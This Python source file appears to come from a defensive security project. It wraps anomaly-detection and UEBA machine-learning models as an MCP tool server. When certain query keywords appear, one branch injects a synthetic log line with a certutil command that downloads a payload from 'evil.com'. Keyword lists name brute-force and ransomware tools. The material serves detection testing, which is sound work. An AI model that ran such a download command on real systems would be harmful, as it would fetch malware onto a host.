"""
ML Threat Detection & UEBA Model Context Protocol (MCP) Server
Directly exposes the scikit-learn IsolationForest and RandomForest Machine Learning models
as an interactive MCP tool for autonomous AI security reasoning.
100% Free & Local - Real-time unsupervised anomaly scoring & UEBA behavioral deviation.
"""
import json
import logging
from typing import Any, Dict
from .tool_server import BaseMCPServer, ToolRequest, ToolResponse
from ..services.ml_engine import ml_engine

logger = logging.getLogger(__name__)


class MLThreatMCPServer(BaseMCPServer):
    name = "ML_Threat_Engine"
    description = "Machine Learning Threat Detection MCP Server (IsolationForest Anomaly Scoring, RandomForest Triage & UEBA Analytics)"
    supported_features = [
        "detect_anomaly",
        "predict_severity",
        "analyze_ueba",
        "get_metrics"
    ]

    def __init__(self):
        super().__init__()
        logger.info("[ML_Threat_Engine MCP] Initialized. scikit-learn models linked to MCP pipeline.")

    def handle_request(self, request: ToolRequest) -> ToolResponse:
        query = request.query.strip()
        metadata = request.metadata or {}
        
        # Build telemetry vector from metadata or parse from query
        telemetry = {
            "rule_level": metadata.get("rule_level", 8.0),
            "frequency": metadata.get("frequency", metadata.get("frequency_last_5m", 12.0)),
            "port_entropy": metadata.get("port_entropy", 1.8),
            "payload_length": metadata.get("payload_length", 512.0),
            "full_log": metadata.get("full_log", query),
            "hour": metadata.get("hour"),
            "user": metadata.get("user", "admin"),
            "failed_ratio": metadata.get("failed_ratio", metadata.get("failed_logins_ratio", 0.1)),
            "outbound_conn_count": metadata.get("outbound_conn_count", 15.0),
            "agent_name": metadata.get("agent_name", "wazuh-agent-01")
        }

        # If query has flags, adjust telemetry heuristically
        q_lower = query.lower()
        if any(w in q_lower for w in ['brute', 'failed', 'hydra', 'ssh', 'logon']):
            telemetry["failed_ratio"] = 0.85
            telemetry["frequency"] = 45.0
            telemetry["rule_level"] = 10.0
        elif any(w in q_lower for w in ['certutil', 'lolbin', 'bitsadmin', 'powershell']):
            telemetry["full_log"] = "certutil.exe -urlcache -f http://evil.com/payload.exe"
            telemetry["rule_level"] = 12.0
            telemetry["outbound_conn_count"] = 35.0
        elif any(w in q_lower for w in ['ransom', 'lockbit', 'encrypt', 'vssadmin']):
            telemetry["rule_level"] = 14.0
            telemetry["frequency"] = 120.0
            telemetry["outbound_conn_count"] = 80.0
        elif any(w in q_lower for w in ['night', 'off-hour', 'midnight', '3am', 'weekend']):
            telemetry["hour"] = 3
            telemetry["user"] = "svc-backup-admin"

        try:
            # 1. Isolation Forest Anomaly Detection
            anomaly_res = ml_engine.predict_anomaly(telemetry)
            
            # 2. Random Forest Severity Prediction
            severity_res = ml_engine.predict_severity(telemetry)
            
            # 3. UEBA Behavioral Analysis
            ueba_res = ml_engine.analyze_ueba(telemetry)

            combined_data = {
                "engine": "Sentinel-AI Enterprise ML Engine (scikit-learn)",
                "isolation_forest": {
                    "is_anomaly": anomaly_res.get("is_anomaly"),
                    "anomaly_score": anomaly_res.get("anomaly_score"),
                    "driving_factors": anomaly_res.get("driving_factors", [])
                },
                "random_forest": {
                    "predicted_severity": severity_res.get("predicted_severity"),
                    "false_positive_probability": severity_res.get("false_positive_probability"),
                    "severity_probabilities": severity_res.get("probabilities", {})
                },
                "ueba": {
                    "entity_user": ueba_res.get("entity_user"),
                    "entity_host": ueba_res.get("entity_host"),
                    "ueba_risk_score": ueba_res.get("ueba_risk_score"),
                    "is_behavioral_anomaly": ueba_res.get("is_behavioral_anomaly"),
                    "anomalous_factors": ueba_res.get("anomalous_factors", [])
                }
            }

            is_threat = anomaly_res.get("is_anomaly") or (anomaly_res.get("anomaly_score", 0) > 40.0)
            status_text = "ANOMALY_CONFIRMED" if is_threat else "NORMAL_BEHAVIOR"

            return ToolResponse(
                tool_name=self.name,
                status="success",
                data=combined_data,
                details=f"ML Inference complete. Status: {status_text} (Score: {anomaly_res.get('anomaly_score')}/100, Predicted Severity: {severity_res.get('predicted_severity')})."
            )

        except Exception as e:
            logger.error(f"Error in MLThreatMCPServer: {e}")
            return ToolResponse(
                tool_name=self.name,
                status="error",
                data={"error": str(e)},
                details=f"ML engine inference encountered error: {e}"
            )
